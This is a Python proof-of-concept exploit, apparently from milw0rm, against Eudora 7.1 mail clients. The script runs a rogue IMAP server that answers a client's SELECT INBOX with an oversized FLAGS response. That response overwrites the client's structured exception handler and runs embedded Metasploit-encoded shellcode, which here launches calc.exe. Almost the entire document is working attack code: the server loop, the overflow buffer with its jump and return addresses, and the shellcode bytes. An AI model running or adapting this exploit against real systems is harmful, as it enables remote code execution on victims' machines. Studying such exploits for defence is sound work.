#!/usr/bin/python
# Eudora 7.1 (IMAP FLAGS) 0day Remote SEH Overwrite PoC Exploit
# Bug discovered by Krystian Kloskowski (h07) <h07@interia.pl>
# Tested on Eudora 7.1.0.9 / 2k SP4 Polish
# Shellcode type: Windows Execute Command (calc.exe)
# Details:..
# Eudora --> SELECT IMBOX  ---------> IMAP server
# Eudora <-- FLAGS (\..AAAA...) <---- IMAP server
# FLAGS (\Answered \Flagged \Draft \Deleted \Seen hasatt + "A" * 1070
# 0x41414141  Pointer to next SEH record
# 0x41414141  SE handler
##

from thread import start_new_thread
from struct import pack
from string import find
from time import sleep
from socket import *

session_elements = (
'* OK IMAP4 ready\r\n',

'* CAPABILITY IMAP4 IMAP4rev1 ACL QUOTA LITERAL+ MAILBOX-REFERRALS NAMESPACE UIDP'
'LUS ID NO_ATOMIC_RENAME UNSELECT CHILDREN MULTIAPPEND BINARY SORT THREAD=ORDERED'
'SUBJECT THREAD=REFERENCES ANNOTATEMORE IDLE SASL-IR\r\n'
'00000 OK completed\r\n',

'00001 OK User logged in\r\n',

'* NAMESPACE (("INBOX." ".")) (("user." ".")) (("" "."))\r\n'
'00002 OK Completed\r\n',

'* LIST (\Noselect) "." ""\r\n'
'00003 OK Completed (0.000 secs 0 calls)\r\n',

'* LIST (\HasChildren) "." "INBOX"\r\n'
'00004 OK Completed (0.000 secs 3 calls)\r\n',

'* LIST (\HasChildren) "." "INBOX"\r\n'
'00005 OK Completed (0.000 secs 3 calls)\r\n',

'* FLAGS (\Answered \Flagged \Draft \Deleted \Seen hasatt%s)\r\n'
'* OK [PERMANENTFLAGS (\Answered \Flagged \Draft \Deleted \Seen hasatt \*)]\r\n'  
'* 1 EXISTS\r\n'
'* 0 RECENT\r\n'
'* OK [UIDVALIDITY 1180222864]\r\n'  
'* OK [UIDNEXT 2]\r\n'  
'* OK [NOMODSEQ] Sorry, modsequences have not been enabled on this mailbox\r\n'
'* OK [URLMECH INTERNAL]\r\n'
'00003 OK [READ-WRITE] Completed\r\n')

shellcode = (
# Restricted Characters: 0x0a, 0x0d, 0x20, 0x29, (0x60 .. 0x7B)
# EXITFUNC=seh CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com    
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44"
"\x42\x30\x42\x50\x42\x50\x4b\x58\x45\x44\x4e\x33\x4b\x48\x4e\x57"
"\x45\x50\x4a\x57\x41\x30\x4f\x4e\x4b\x38\x4f\x34\x4a\x31\x4b\x58"
"\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x54\x4b\x38\x46\x43\x4b\x58"
"\x41\x50\x50\x4e\x41\x53\x42\x4c\x49\x49\x4e\x4a\x46\x58\x42\x4c"
"\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x53\x46\x35\x46\x42\x46\x30\x45\x57\x45\x4e\x4b\x38"
"\x4f\x45\x46\x52\x41\x50\x4b\x4e\x48\x56\x4b\x48\x4e\x50\x4b\x54"
"\x4b\x48\x4f\x45\x4e\x51\x41\x30\x4b\x4e\x4b\x58\x4e\x51\x4b\x48"
"\x41\x50\x4b\x4e\x49\x58\x4e\x55\x46\x52\x46\x50\x43\x4c\x41\x53"
"\x42\x4c\x46\x56\x4b\x38\x42\x34\x42\x33\x45\x38\x42\x4c\x4a\x47"
"\x4e\x50\x4b\x38\x42\x44\x4e\x50\x4b\x38\x42\x47\x4e\x41\x4d\x4a"
"\x4b\x48\x4a\x56\x4a\x30\x4b\x4e\x49\x30\x4b\x48\x42\x48\x42\x4b"
"\x42\x50\x42\x30\x42\x50\x4b\x38\x4a\x36\x4e\x43\x4f\x35\x41\x43"
"\x48\x4f\x42\x56\x48\x55\x49\x58\x4a\x4f\x43\x38\x42\x4c\x4b\x57"
"\x42\x35\x4a\x56\x42\x4f\x4c\x48\x46\x50\x4f\x45\x4a\x56\x4a\x49"
"\x50\x4f\x4c\x38\x50\x30\x47\x55\x4f\x4f\x47\x4e\x43\x46\x41\x36"
"\x4e\x36\x43\x36\x42\x50\x5a")

NEXT_SEH_RECORD = 0x909006EB  # JMP SHORT + 0x06
SE_HANDLER = 0x7CEA41D3       # POP POP RET (SHELL32.DLL / 2k SP4 Polish)

buf = "A" * 1062
buf += pack("<L", NEXT_SEH_RECORD)
buf += pack("<L", SE_HANDLER)
buf += "\x90" * 32
buf += shellcode

def AcceptConnect(cl, addr):
    print "Connection accepted from: %s" % (addr[0])
    try:
        for i in range(0, len(session_elements) - 1):
            cl.send(session_elements[i])
            response = cl.recv(256)
            retval = find(response, 'SELECT INBOX')
            if(retval != -1):
                cl.send(session_elements[7] % (buf))
                sleep(1)
                print "Done"
                break
        cl.close()        
    except Exception, err:
        print err

bind_addr = '0.0.0.0'
bind_port = 143        

s = socket(AF_INET, SOCK_STREAM)
s.bind((bind_addr, bind_port))
s.listen(1)
print "Listening on %s:%d..." % (bind_addr, bind_port)
while(1):
    cl, addr = s.accept()
    start_new_thread(AcceptConnect, (cl, addr,))

# EoF

# milw0rm.com [2007-05-30]
